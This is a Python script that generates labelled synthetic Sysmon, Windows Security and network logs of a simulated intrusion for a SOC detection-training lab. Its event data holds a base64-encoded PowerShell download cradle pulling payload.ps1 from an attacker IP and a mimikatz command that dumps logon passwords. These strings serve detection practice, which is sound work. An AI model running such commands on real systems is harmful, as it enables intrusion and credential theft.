#!/usr/bin/env python3
"""Generate synthetic SOC logs for test_soc mini lab."""
import json, csv, random
from datetime import datetime, timedelta

base = datetime(2026, 10, 4, 14, 0, 0)
random.seed(42)

def ts(minutes=0):
    return (base + timedelta(minutes=minutes)).isoformat() + "Z"

# --- Sysmon JSONL ---
sysmon_events = [
    # benign
    {"@timestamp": ts(0), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\j.doe", "Image": "C:\\Windows\\Explorer.EXE", "CommandLine": "explorer.exe", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "ParentCommandLine": "userinit.exe", "Hashes": "SHA256=AAA", "Description": "benign explorer start"},
    {"@timestamp": ts(1), "EventID": 3, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "DestinationIp": "142.250.179.14", "DestinationPort": 443, "Protocol": "tcp", "Description": "chrome to google"},
    {"@timestamp": ts(2), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\j.doe", "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\j.doe\\notes.txt", "ParentImage": "C:\\Windows\\Explorer.EXE", "Description": "benign notepad"},
    # attacker brute force phase - will correlate with Security 4625
    {"@timestamp": ts(5), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "DC01.corp.local", "User": "CORP\\j.doe", "Image": "C:\\Windows\\System32\\mstsc.exe", "CommandLine": "mstsc.exe /v:10.0.1.10", "ParentImage": "C:\\Windows\\Explorer.EXE", "SourceIp": "192.168.1.105", "Description": "mstsc from external-like IP (sim RDP)"},
    # successful RDP + powershell download cradle
    {"@timestamp": ts(7), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\Administrator", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -W Hidden -Enc SQBmACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "svchost.exe -k netsvcs", "Description": "MALICIOUS: base64 encoded IEX download cradle"},
    {"@timestamp": ts(7), "EventID": 11, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\Public\\payload.ps1", "Description": "powershell creates payload file"},
    # mimikatz / lsass
    {"@timestamp": ts(9), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\Administrator", "Image": "C:\\Users\\Public\\mimikatz.exe", "CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Hashes": "SHA256=BAD123", "Description": "MALICIOUS: mimikatz execution"},
    {"@timestamp": ts(9), "EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "SourceImage": "C:\\Users\\Public\\mimikatz.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "Description": "MALICIOUS: lsass access"},
    {"@timestamp": ts(10), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\Administrator", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami /priv", "ParentImage": "C:\\Users\\Public\\mimikatz.exe", "Description": "mimikatz spawns cmd"},
    # psexec lateral movement
    {"@timestamp": ts(12), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS02.corp.local", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\PSEXESVC.exe", "CommandLine": "PSEXESVC.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "Description": "MALICIOUS: PsExec service"},
    {"@timestamp": ts(12), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS02.corp.local", "User": "CORP\\Administrator", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c ipconfig /all", "ParentImage": "C:\\Windows\\PSEXESVC.exe", "Description": "PsExec spawned cmd on WS02"},
    {"@timestamp": ts(13), "EventID": 3, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "Image": "C:\\Windows\\PSEXESVC.exe", "DestinationIp": "10.0.1.12", "DestinationPort": 445, "Protocol": "tcp", "Description": "MALICIOUS: SMB lateral to WS02"},
    # benign again
    {"@timestamp": ts(15), "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS01.corp.local", "User": "CORP\\j.doe", "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k NetworkService", "ParentImage": "C:\\Windows\\System32\\services.exe", "Description": "benign svchost"},
]

# --- Security CSV ---
sec_rows = [
    ["TimeCreated","EventID","Computer","TargetUserName","SourceIP","LogonType","Status","Details"],
    [ts(3), 4625, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0xC000006D", "Failed RDP logon - bad password"],
    [ts(3), 4625, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0xC000006D", "Failed RDP logon"],
    [ts(4), 4625, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0xC000006D", "Failed RDP logon"],
    [ts(4), 4625, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0xC000006D", "Failed RDP logon"],
    [ts(5), 4625, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0xC000006D", "Failed RDP logon - 5th attempt"],
    [ts(6), 4624, "DC01.corp.local", "Administrator", "192.168.1.105", 10, "0x0", "Successful RDP logon after brute force"],
    [ts(6), 4672, "DC01.corp.local", "Administrator", "-", "-", "0x0", "Special privileges assigned (SeDebugPrivilege)"],
    [ts(7), 4688, "WS01.corp.local", "Administrator", "-", "-", "0x0", "New process: powershell.exe -Enc ..."],
    [ts(9), 4688, "WS01.corp.local", "Administrator", "-", "-", "0x0", "New process: mimikatz.exe"],
    [ts(12), 7045, "WS02.corp.local", "SYSTEM", "-", "-", "0x0", "Service PSEXESVC installed"],
    [ts(12), 4624, "WS02.corp.local", "Administrator", "10.0.1.10", 3, "0x0", "Network logon from WS01 (PsExec)"],
    [ts(0), 4624, "WS01.corp.local", "j.doe", "10.0.1.10", 2, "0x0", "Benign interactive logon"],
]

# --- Network traffic CSV ---
net_rows = [
    ["timestamp","src_ip","src_port","dst_ip","dst_port","proto","bytes","flow","note"],
    [ts(1), "10.0.1.10", 52341, "142.250.179.14", 443, "tcp", 12400, "benign", "chrome tls"],
    [ts(3), "192.168.1.105", 41122, "10.0.1.10", 3389, "tcp", 800, "suspicious", "RDP brute force attempt 1"],
    [ts(4), "192.168.1.105", 41123, "10.0.1.10", 3389, "tcp", 800, "suspicious", "RDP brute force attempt 2"],
    [ts(5), "192.168.1.105", 41124, "10.0.1.10", 3389, "tcp", 2400, "suspicious", "RDP brute force burst"],
    [ts(6), "192.168.1.105", 41125, "10.0.1.10", 3389, "tcp", 5400, "malicious", "RDP success + session"],
    [ts(7), "10.0.1.10", 52355, "192.168.1.105", 80, "tcp", 150000, "malicious", "payload.ps1 download (http)"],
    [ts(8), "10.0.1.10", 52360, "8.8.8.8", 53, "udp", 128, "benign", "dns query"],
    [ts(12), "10.0.1.10", 49111, "10.0.1.12", 445, "tcp", 98000, "malicious", "SMB PsExec to WS02"],
    [ts(12), "10.0.1.10", 49112, "10.0.1.12", 135, "tcp", 1200, "malicious", "RPC lateral"],
    [ts(15), "10.0.1.12", 49155, "10.0.1.10", 445, "tcp", 3000, "benign", "normal smb keepalive"],
]

import pathlib
base_dir = pathlib.Path(__file__).parent.parent
with open(base_dir / "logs" / "sysmon.jsonl", "w", encoding="utf-8") as f:
    for e in sysmon_events:
        f.write(json.dumps(e) + "\n")
with open(base_dir / "logs" / "security.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f); w.writerows(sec_rows)
with open(base_dir / "logs" / "network_traffic.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f); w.writerows(net_rows)
print(f"Generated {len(sysmon_events)} sysmon, {len(sec_rows)-1} security, {len(net_rows)-1} network events -> logs/")
